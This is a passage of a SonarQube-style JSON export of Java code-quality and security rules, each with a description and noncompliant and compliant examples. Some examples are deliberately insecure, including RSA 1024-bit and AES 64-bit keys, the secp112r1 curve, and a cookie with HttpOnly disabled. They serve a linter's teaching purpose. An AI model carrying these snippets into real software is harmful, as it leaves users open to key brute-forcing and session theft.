            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S4426",
            "repo": "java",
            "name": "Cryptographic keys should be robust",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Most of cryptographic systems require a sufficient key size to be robust against brute-force attacks.</p>\n<p><a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar2.pdf\">NIST recommendations</a> will be checked for these\nuse-cases:</p>\n<p><strong>Digital Signature Generation</strong> and <strong>Verification:</strong> </p>\n<ul>\n  <li> p ≥ 2048 AND q ≥ 224 for DSA (<code>p</code> is key length and <code>q</code> the modulus length) </li>\n  <li> n ≥ 2048 for RSA (<code>n</code> is the key length) </li>\n</ul>\n<p><strong>Key Agreement</strong>: </p>\n<ul>\n  <li> p ≥ 2048 AND q ≥ 224 for DH and MQV </li>\n  <li> n ≥ 224 for ECDH and ECMQV (Examples: <code>secp192r1</code> is a non-compliant curve (<code>n</code> &lt; 224) but <code>secp224k1</code> is\n  compliant (<code>n</code> &gt;= 224)) </li>\n</ul>\n<p><strong>Symmetric keys</strong>: </p>\n<ul>\n  <li> key length ≥ 128 bits </li>\n</ul>\n<p>This rule will not raise issues for ciphers that are considered weak (no matter the key size) like <code>DES</code>, <code>Blowfish</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nKeyPairGenerator keyPairGen1 = KeyPairGenerator.getInstance(\"RSA\");\nkeyPairGen1.initialize(1024); // Noncompliant\n\nKeyPairGenerator keyPairGen5 = KeyPairGenerator.getInstance(\"EC\");\nECGenParameterSpec ecSpec1 = new ECGenParameterSpec(\"secp112r1\"); // Noncompliant\nkeyPairGen5.initialize(ecSpec1);\n\nKeyGenerator keyGen1 = KeyGenerator.getInstance(\"AES\");\nkeyGen1.init(64); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nKeyPairGenerator keyPairGen6 = KeyPairGenerator.getInstance(\"RSA\");\nkeyPairGen6.initialize(2048); // Compliant\n\nKeyPairGenerator keyPairGen5 = KeyPairGenerator.getInstance(\"EC\");\nECGenParameterSpec ecSpec10 = new ECGenParameterSpec(\"secp224k1\"); // compliant\nkeyPairGen5.initialize(ecSpec10);\n\nKeyGenerator keyGen2 = KeyGenerator.getInstance(\"AES\");\nkeyGen2.init(128); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf\">NIST 800-131A</a> - Recommendation for Transitioning the\n  Use of Cryptographic Algorithms and Key Lengths </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/326.html\">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>\n</ul>",
            "mdDesc": "<p>Most of cryptographic systems require a sufficient key size to be robust against brute-force attacks.</p>\n<p><a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar2.pdf\">NIST recommendations</a> will be checked for these\nuse-cases:</p>\n<p><strong>Digital Signature Generation</strong> and <strong>Verification:</strong> </p>\n<ul>\n  <li> p ≥ 2048 AND q ≥ 224 for DSA (<code>p</code> is key length and <code>q</code> the modulus length) </li>\n  <li> n ≥ 2048 for RSA (<code>n</code> is the key length) </li>\n</ul>\n<p><strong>Key Agreement</strong>: </p>\n<ul>\n  <li> p ≥ 2048 AND q ≥ 224 for DH and MQV </li>\n  <li> n ≥ 224 for ECDH and ECMQV (Examples: <code>secp192r1</code> is a non-compliant curve (<code>n</code> &lt; 224) but <code>secp224k1</code> is\n  compliant (<code>n</code> &gt;= 224)) </li>\n</ul>\n<p><strong>Symmetric keys</strong>: </p>\n<ul>\n  <li> key length ≥ 128 bits </li>\n</ul>\n<p>This rule will not raise issues for ciphers that are considered weak (no matter the key size) like <code>DES</code>, <code>Blowfish</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nKeyPairGenerator keyPairGen1 = KeyPairGenerator.getInstance(\"RSA\");\nkeyPairGen1.initialize(1024); // Noncompliant\n\nKeyPairGenerator keyPairGen5 = KeyPairGenerator.getInstance(\"EC\");\nECGenParameterSpec ecSpec1 = new ECGenParameterSpec(\"secp112r1\"); // Noncompliant\nkeyPairGen5.initialize(ecSpec1);\n\nKeyGenerator keyGen1 = KeyGenerator.getInstance(\"AES\");\nkeyGen1.init(64); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nKeyPairGenerator keyPairGen6 = KeyPairGenerator.getInstance(\"RSA\");\nkeyPairGen6.initialize(2048); // Compliant\n\nKeyPairGenerator keyPairGen5 = KeyPairGenerator.getInstance(\"EC\");\nECGenParameterSpec ecSpec10 = new ECGenParameterSpec(\"secp224k1\"); // compliant\nkeyPairGen5.initialize(ecSpec10);\n\nKeyGenerator keyGen2 = KeyGenerator.getInstance(\"AES\");\nkeyGen2.init(128); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf\">NIST 800-131A</a> - Recommendation for Transitioning the\n  Use of Cryptographic Algorithms and Key Lengths </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/326.html\">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>\n</ul>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "owasp-a3",
                "owasp-a6",
                "privacy",
                "rules"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S1157",
            "repo": "java",
            "name": "Case insensitive string comparisons should be made without intermediate upper or lower casing",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Using <code>toLowerCase()</code> or <code>toUpperCase()</code> to make case insensitive comparisons is inefficient because it requires the creation\nof temporary, intermediate <code>String</code> objects.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nboolean result1 = foo.toUpperCase().equals(bar);             // Noncompliant\nboolean result2 = foo.equals(bar.toUpperCase());             // Noncompliant\nboolean result3 = foo.toLowerCase().equals(bar.LowerCase()); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nboolean result = foo.equalsIgnoreCase(bar);                  // Compliant\n</pre>\n<h2>Exceptions</h2>\n<p>No issue will be raised when a locale is specified because the result could be different from \"equalsIgnoreCase\". (e.g.: using the Turkish\nlocale)</p>\n<pre>\nboolean result1 = foo.toUpperCase(locale).equals(bar);             // Compliant\n</pre>",
            "mdDesc": "<p>Using <code>toLowerCase()</code> or <code>toUpperCase()</code> to make case insensitive comparisons is inefficient because it requires the creation\nof temporary, intermediate <code>String</code> objects.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nboolean result1 = foo.toUpperCase().equals(bar);             // Noncompliant\nboolean result2 = foo.equals(bar.toUpperCase());             // Noncompliant\nboolean result3 = foo.toLowerCase().equals(bar.LowerCase()); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nboolean result = foo.equalsIgnoreCase(bar);                  // Compliant\n</pre>\n<h2>Exceptions</h2>\n<p>No issue will be raised when a locale is specified because the result could be different from \"equalsIgnoreCase\". (e.g.: using the Turkish\nlocale)</p>\n<pre>\nboolean result1 = foo.toUpperCase(locale).equals(bar);             // Compliant\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3577",
            "repo": "java",
            "name": "Test classes should comply with a naming convention",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Shared naming conventions allow teams to collaborate efficiently. This rule raises an issue when a test class name does not match the provided\nregular expression.</p>\n<h2>Noncompliant Code Example</h2>\n<p>With the default value: <code>^((Test|IT)[a-zA-Z0-9_]+|[A-Z][a-zA-Z0-9_]*(Test|Tests|TestCase|IT|ITCase))$</code></p>\n<pre>\nclass Foo {  // Noncompliant\n  @Test\n  void check() {  }\n}\n\nclass Bar {  // Noncompliant\n  @Nested\n  class PositiveCase {\n    @Test\n    void check() {  }\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass FooTest {\n  @Test\n  void check() {  }\n}\n\nclass BarIT {\n  @Nested\n  class PositiveCase {\n    @Test\n    void check() {  }\n  }\n}\n</pre>",
            "mdDesc": "<p>Shared naming conventions allow teams to collaborate efficiently. This rule raises an issue when a test class name does not match the provided\nregular expression.</p>\n<h2>Noncompliant Code Example</h2>\n<p>With the default value: <code>^((Test|IT)[a-zA-Z0-9_]+|[A-Z][a-zA-Z0-9_]*(Test|Tests|TestCase|IT|ITCase))$</code></p>\n<pre>\nclass Foo {  // Noncompliant\n  @Test\n  void check() {  }\n}\n\nclass Bar {  // Noncompliant\n  @Nested\n  class PositiveCase {\n    @Test\n    void check() {  }\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass FooTest {\n  @Test\n  void check() {  }\n}\n\nclass BarIT {\n  @Nested\n  class PositiveCase {\n    @Test\n    void check() {  }\n  }\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "convention",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "format",
                    "htmlDesc": "Regular expression against which test class names are checked.",
                    "defaultValue": "^((Test|IT)[a-zA-Z0-9_]+|[A-Z][a-zA-Z0-9_]*(Test|Tests|TestCase|IT|ITCase))$",
                    "type": "STRING"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5998",
            "repo": "java",
            "name": "Regular expressions should not overflow the stack",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The Java regex engine uses recursive method calls to implement backtracking. Therefore when a repetition inside a regular expression contains\nmultiple paths (i.e. the body of the repetition contains an alternation (<code>|</code>), an optional element or another repetition), trying to match\nthe regular expression can cause a stack overflow on large inputs. This does not happen when using a possessive quantifier (such as <code>*+</code>\ninstead of <code>*</code>) or when using a character class inside a repetition (e.g. <code>[ab]*</code> instead of <code>(a|b)*</code>).</p>\n<p>The size of the input required to overflow the stack depends on various factors, including of course the stack size of the JVM. One thing that\nsignificantly increases the size of the input that can be processed is if each iteration of the repetition goes through a chain of multiple constant\ncharacters because such consecutive characters will be matched by the regex engine without invoking any recursion.</p>\n<p>For example, on a JVM with a stack size of 1MB, the regex <code>(?:a|b)*</code> will overflow the stack after matching around 6000 characters\n(actual numbers may differ between JVM versions and even across multiple runs on the same JVM) whereas <code>(?:abc|def)*</code> can handle around\n15000 characters.</p>\n<p>Since often times stack growth can't easily be avoided, this rule will only report issues on regular expressions if they can cause a stack overflow\non realistically sized inputs. You can adjust the <code>maxStackConsumptionFactor</code> parameter to adjust this.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nPattern.compile(\"(a|b)*\"); // Noncompliant\nPattern.compile(\"(.|\\n)*\"); // Noncompliant\nPattern.compile(\"(ab?)*\"); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPattern.compile(\"[ab]*\"); // Character classes don't cause recursion the way that '|' does\nPattern.compile(\"(?s).*\"); // Enabling the (?s) flag makes '.' match line breaks, so '|\\n' isn't necessary\nPattern.compile(\"(ab?)*+\"); // Possessive quantifiers don't cause recursion because they disable backtracking\n</pre>",
            "mdDesc": "<p>The Java regex engine uses recursive method calls to implement backtracking. Therefore when a repetition inside a regular expression contains\nmultiple paths (i.e. the body of the repetition contains an alternation (<code>|</code>), an optional element or another repetition), trying to match\nthe regular expression can cause a stack overflow on large inputs. This does not happen when using a possessive quantifier (such as <code>*+</code>\ninstead of <code>*</code>) or when using a character class inside a repetition (e.g. <code>[ab]*</code> instead of <code>(a|b)*</code>).</p>\n<p>The size of the input required to overflow the stack depends on various factors, including of course the stack size of the JVM. One thing that\nsignificantly increases the size of the input that can be processed is if each iteration of the repetition goes through a chain of multiple constant\ncharacters because such consecutive characters will be matched by the regex engine without invoking any recursion.</p>\n<p>For example, on a JVM with a stack size of 1MB, the regex <code>(?:a|b)*</code> will overflow the stack after matching around 6000 characters\n(actual numbers may differ between JVM versions and even across multiple runs on the same JVM) whereas <code>(?:abc|def)*</code> can handle around\n15000 characters.</p>\n<p>Since often times stack growth can't easily be avoided, this rule will only report issues on regular expressions if they can cause a stack overflow\non realistically sized inputs. You can adjust the <code>maxStackConsumptionFactor</code> parameter to adjust this.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nPattern.compile(\"(a|b)*\"); // Noncompliant\nPattern.compile(\"(.|\\n)*\"); // Noncompliant\nPattern.compile(\"(ab?)*\"); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPattern.compile(\"[ab]*\"); // Character classes don't cause recursion the way that '|' does\nPattern.compile(\"(?s).*\"); // Enabling the (?s) flag makes '.' match line breaks, so '|\\n' isn't necessary\nPattern.compile(\"(ab?)*+\"); // Possessive quantifiers don't cause recursion because they disable backtracking\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "regex"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "maxStackConsumptionFactor",
                    "htmlDesc": "An indicator approximately proportional to how quickly the stack grows relative to the input size. An issue will be reported if the value for a regex exceeds the maximum set here. Setting this to 0 will cause an issue to be reported for all regular expressions with non-constant stack consumption.",
                    "defaultValue": "5.0",
                    "type": "STRING"
                }
            ],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2122",
            "repo": "java",
            "name": "\"ScheduledThreadPoolExecutor\" should not have 0 core threads",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>java.util.concurrent.ScheduledThreadPoolExecutor</code>'s pool is sized with <code>corePoolSize</code>, so setting <code>corePoolSize</code>\nto zero means the executor will have no threads and run nothing.</p>\n<p>This rule detects instances where <code>corePoolSize</code> is set to zero, via either its setter or the object constructor.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void do(){\n\n  ScheduledThreadPoolExecutor stpe1 = new ScheduledThreadPoolExecutor(0); // Noncompliant\n\n  ScheduledThreadPoolExecutor stpe2 = new ScheduledThreadPoolExecutor(POOL_SIZE);\n  stpe2.setCorePoolSize(0);  // Noncompliant\n</pre>",
            "mdDesc": "<p><code>java.util.concurrent.ScheduledThreadPoolExecutor</code>'s pool is sized with <code>corePoolSize</code>, so setting <code>corePoolSize</code>\nto zero means the executor will have no threads and run nothing.</p>\n<p>This rule detects instances where <code>corePoolSize</code> is set to zero, via either its setter or the object constructor.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void do(){\n\n  ScheduledThreadPoolExecutor stpe1 = new ScheduledThreadPoolExecutor(0); // Noncompliant\n\n  ScheduledThreadPoolExecutor stpe2 = new ScheduledThreadPoolExecutor(POOL_SIZE);\n  stpe2.setCorePoolSize(0);  // Noncompliant\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S4425",
            "repo": "java",
            "name": "\"Integer.toHexString\" should not be used to build hexadecimal strings",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Using <code>Integer.toHexString</code> is a common mistake when converting sequences of bytes into hexadecimal string representations. The problem\nis that the method trims leading zeroes, which can lead to wrong conversions. For instance a two bytes value of <code>0x4508</code> would be converted\ninto <code>45</code> and <code>8</code> which once concatenated would give <code>0x458</code>.</p>\n<p>This is particularly damaging when converting hash-codes and could lead to a security vulnerability.</p>\n<p>This rule raises an issue when <code>Integer.toHexString</code> is used in any kind of string concatenations.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nMessageDigest md = MessageDigest.getInstance(\"SHA-256\");\nbyte[] bytes = md.digest(password.getBytes(\"UTF-8\"));\n\nStringBuilder sb = new StringBuilder();\nfor (byte b : bytes) {\n    sb.append(Integer.toHexString( b &amp; 0xFF )); // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nMessageDigest md = MessageDigest.getInstance(\"SHA-256\");\nbyte[] bytes = md.digest(password.getBytes(\"UTF-8\"));\n\nStringBuilder sb = new StringBuilder();\nfor (byte b : bytes) {\n    sb.append(String.format(\"%02X\", b));\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/704.html\">MITRE, CWE-704</a> - Incorrect Type Conversion or Cast </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#BAD_HEXA_CONVERSION\">BAD_HEXA_CONVERSION</a> </li>\n</ul>",
            "mdDesc": "<p>Using <code>Integer.toHexString</code> is a common mistake when converting sequences of bytes into hexadecimal string representations. The problem\nis that the method trims leading zeroes, which can lead to wrong conversions. For instance a two bytes value of <code>0x4508</code> would be converted\ninto <code>45</code> and <code>8</code> which once concatenated would give <code>0x458</code>.</p>\n<p>This is particularly damaging when converting hash-codes and could lead to a security vulnerability.</p>\n<p>This rule raises an issue when <code>Integer.toHexString</code> is used in any kind of string concatenations.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nMessageDigest md = MessageDigest.getInstance(\"SHA-256\");\nbyte[] bytes = md.digest(password.getBytes(\"UTF-8\"));\n\nStringBuilder sb = new StringBuilder();\nfor (byte b : bytes) {\n    sb.append(Integer.toHexString( b &amp; 0xFF )); // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nMessageDigest md = MessageDigest.getInstance(\"SHA-256\");\nbyte[] bytes = md.digest(password.getBytes(\"UTF-8\"));\n\nStringBuilder sb = new StringBuilder();\nfor (byte b : bytes) {\n    sb.append(String.format(\"%02X\", b));\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/704.html\">MITRE, CWE-704</a> - Incorrect Type Conversion or Cast </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#BAD_HEXA_CONVERSION\">BAD_HEXA_CONVERSION</a> </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5993",
            "repo": "java",
            "name": "Constructors of an \"abstract\" class should not be declared \"public\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Abstract classes should not have public constructors. Constructors of abstract classes can only be called in constructors of their subclasses. So\nthere is no point in making them public. The <code>protected</code> modifier should be enough.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic abstract class AbstractClass1 {\n    public AbstractClass1 () { // Noncompliant, has public modifier\n        // do something here\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic abstract class AbstractClass2 {\n    protected AbstractClass2 () {\n        // do something here\n    }\n}\n</pre>",
            "mdDesc": "<p>Abstract classes should not have public constructors. Constructors of abstract classes can only be called in constructors of their subclasses. So\nthere is no point in making them public. The <code>protected</code> modifier should be enough.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic abstract class AbstractClass1 {\n    public AbstractClass1 () { // Noncompliant, has public modifier\n        // do something here\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic abstract class AbstractClass2 {\n    protected AbstractClass2 () {\n        // do something here\n    }\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "design"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1155",
            "repo": "java",
            "name": "Collection.isEmpty() should be used to test for emptiness",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Using <code>Collection.size()</code> to test for emptiness works, but using <code>Collection.isEmpty()</code> makes the code more readable and can\nbe more performant. The time complexity of any <code>isEmpty()</code> method implementation should be <code>O(1)</code> whereas some implementations\nof <code>size()</code> can be <code>O(n)</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (myCollection.size() == 0) {  // Noncompliant\n  /* ... */\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (myCollection.isEmpty()) {\n  /* ... */\n}\n</pre>",
            "mdDesc": "<p>Using <code>Collection.size()</code> to test for emptiness works, but using <code>Collection.isEmpty()</code> makes the code more readable and can\nbe more performant. The time complexity of any <code>isEmpty()</code> method implementation should be <code>O(1)</code> whereas some implementations\nof <code>size()</code> can be <code>O(n)</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (myCollection.size() == 0) {  // Noncompliant\n  /* ... */\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (myCollection.isEmpty()) {\n  /* ... */\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2123",
            "repo": "java",
            "name": "Values should not be uselessly incremented",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>A value that is incremented or decremented and then not stored is at best wasted code and at worst a bug.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic int pickNumber() {\n  int i = 0;\n  int j = 0;\n\n  i = i++; // Noncompliant; i is still zero\n\n  return j++; // Noncompliant; 0 returned\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic int pickNumber() {\n  int i = 0;\n  int j = 0;\n\n  i++;\n  return ++j;\n}\n</pre>",
            "mdDesc": "<p>A value that is incremented or decremented and then not stored is at best wasted code and at worst a bug.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic int pickNumber() {\n  int i = 0;\n  int j = 0;\n\n  i = i++; // Noncompliant; i is still zero\n\n  return j++; // Noncompliant; 0 returned\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic int pickNumber() {\n  int i = 0;\n  int j = 0;\n\n  i++;\n  return ++j;\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "unused"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S3330",
            "repo": "java",
            "name": "Creating cookies without the \"HttpOnly\" flag is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When a cookie is configured with the <code>HttpOnly</code> attribute set to <em>true</em>, the browser guaranties that no client-side script will\nbe able to read it. In most cases, when a cookie is created, the default value of <code>HttpOnly</code> is <em>false</em> and it's up to the developer\nto decide whether or not the content of the cookie can be read by the client-side script. As a majority of Cross-Site Scripting (XSS) attacks target\nthe theft of session-cookies, the <code>HttpOnly</code> attribute can help to reduce their impact as it won't be possible to exploit the XSS\nvulnerability to steal session-cookies.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the cookie is sensitive, used to authenticate the user, for instance a <em>session-cookie</em> </li>\n  <li> the <code>HttpOnly</code> attribute offer an additional protection (not the case for an <em>XSRF-TOKEN cookie</em> / CSRF token for example)\n  </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> By default the <code>HttpOnly</code> flag should be set to <em>true</em> for most of the cookies and it's mandatory for session /\n  sensitive-security cookies. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>If you create a security-sensitive cookie in your JAVA code:</p>\n<pre>\nCookie c = new Cookie(COOKIENAME, sensitivedata);\nc.setHttpOnly(false);  // Sensitive: this sensitive cookie is created with the httponly flag set to false and so it can be stolen easily in case of XSS vulnerability\n</pre>\n<p>By default the <a href=\"https://docs.oracle.com/javaee/6/api/javax/servlet/http/Cookie.html#setHttpOnly(boolean)\"><code>HttpOnly</code></a> flag is\nset to <em>false:</em></p>\n<pre>\nCookie c = new Cookie(COOKIENAME, sensitivedata);  // Sensitive: this sensitive cookie is created with the httponly flag not defined (by default set to false) and so it can be stolen easily in case of XSS vulnerability\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nCookie c = new Cookie(COOKIENAME, sensitivedata);\nc.setHttpOnly(true); // Compliant: this sensitive cookie is protected against theft (HttpOnly=true)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/HttpOnly\">OWASP HttpOnly</a> </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)\">OWASP Top 10 2017 Category A7</a> - Cross-Site Scripting\n  (XSS) </li>\n  <li> <a 